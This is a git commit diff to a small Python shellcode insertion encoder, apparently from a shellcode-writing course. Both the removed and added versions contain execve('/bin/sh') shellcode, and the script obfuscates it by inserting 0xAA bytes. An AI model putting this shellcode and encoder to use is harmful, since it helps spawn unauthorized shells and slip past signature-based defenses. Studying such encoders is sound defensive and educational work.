d1f9de533525559d82e7656067b7475e8f7fb462
TheRavehorn <nababkind@gmail.com>
2020-11-15 17:19:08 +0200

    Fixes.

--- Shellcode/Insertion/Insertion-Encoder.py
+++ Shellcode/Insertion/Insertion-Encoder.py
@@ -1,25 +1,27 @@
-#! /usr/bin/python
-# Python Insertion Encoder
+#!/usr/bin/python2
 
-shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+# Python Insertion Encoder 
+import random
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
 
 encoded = ""
 encoded2 = ""
 
-print("Encoding shellcode...\n")
+print 'Encoding shellcode ...'
 
-for x in bytearray(shellcode):
-    # Insertion Encoding
+for x in bytearray(shellcode) :
+	encoded += '\\x'
+	encoded += '%02x' % x
+	encoded += '\\x%02x' % 0xAA
 
-    encoded += "\\x"
-    encoded += "%02x" % x
-    encoded += "\\x%02x" % 0xAA
 
-    encoded2 += "0x"
-    encoded2 += "%02x, " % x
-    encoded2 += "0x%02x, " % 0xAA
+	encoded2 += '0x'
+	encoded2 += '%02x,' %x
+	encoded2 += '0x%02x,' % 0xAA
 
-print("Verison 1:", encoded, "\n")
-print("Verison 2:", encoded2[:-2], "\n")
+print encoded
 
-print("Len: %d" % (len(shellcode) * 2))
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
